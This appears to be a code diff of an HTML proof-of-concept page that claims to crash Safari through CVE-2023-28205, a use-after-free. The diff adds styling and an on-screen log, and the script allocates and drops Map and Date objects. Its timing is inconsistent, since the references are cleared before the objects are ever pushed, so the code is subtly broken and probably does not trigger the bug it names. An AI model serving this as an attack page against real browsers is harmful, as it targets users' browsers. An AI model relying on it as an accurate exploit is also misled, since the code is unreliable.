@@ -1,17 +1,77 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" >
 <head>
   <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>CVE-2023-28205 PoC Crash</title>
+  <style>
+    body {
+      background: #121212;
+      color: #e0e0e0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+      margin: 0;
+      padding: 2rem;
+    }
+    h1 {
+      margin-bottom: 1rem;
+      font-weight: 700;
+      font-size: 2rem;
+    }
+    button {
+      background-color: #1e88e5;
+      color: white;
+      border: none;
+      padding: 0.75rem 1.5rem;
+      font-size: 1rem;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-bottom: 1.5rem;
+      box-shadow: 0 4px 12px rgba(30,136,229,0.5);
+    }
+    button:hover {
+      background-color: #1565c0;
+    }
+    #log {
+      background: #222;
+      width: 100%;
+      max-width: 600px;
+      height: 300px;
+      border-radius: 8px;
+      padding: 1rem;
+      overflow-y: auto;
+      font-family: monospace;
+      font-size: 0.9rem;
+      box-shadow: inset 0 0 8px #000;
+      white-space: pre-wrap;
+      user-select: text;
+    }
+  </style>
 </head>
 <body>
-  <h1>Trigger CVE-2023-28205 Safari Crash</h1>
-  <button id="start">Start Crash</button>
+  <h1>CVE-2023-28205 Safari Crash PoC</h1>
+  <button id="start">Start Crash Test</button>
+  <div id="log" aria-live="polite" aria-atomic="true"></div>
+
   <script>
     const mapArray = [];
     const dateArray = [];
+    const logEl = document.getElementById('log');
+
+    function log(message) {
+      const timestamp = new Date().toLocaleTimeString();
+      logEl.textContent += `[${timestamp}] ${message}\n`;
+      logEl.scrollTop = logEl.scrollHeight;
+      console.log(message);
+    }
 
     function triggerUAF() {
+      log("Starting exploit... Creating Map and Date objects.");
       for (let i = 0; i < 10000; i++) {
         const m = new Map();
         const d = new Date();
@@ -19,22 +79,30 @@
         if (i % 2 === 0) {
           setTimeout(() => {
             mapArray.push(m);
+            if (mapArray.length % 1000 === 0) {
+              log(`Added ${mapArray.length} Map objects`);
+            }
           }, 1000);
         } else {
           setTimeout(() => {
             dateArray.push(d);
+            if (dateArray.length % 1000 === 0) {
+              log(`Added ${dateArray.length} Date objects`);
+            }
           }, 1000);
         }
       }
 
       setTimeout(() => {
+        log("Dropping references to trigger garbage collection...");
         mapArray.length = 0;
         dateArray.length = 0;
-        console.log("References dropped, triggering GC...");
+        log("References dropped. Waiting for Safari to crash (if vulnerable)...");
       }, 500);
     }
 
     document.getElementById('start').addEventListener('click', () => {
+      log("Button clicked.");
       triggerUAF();
     });
   </script>
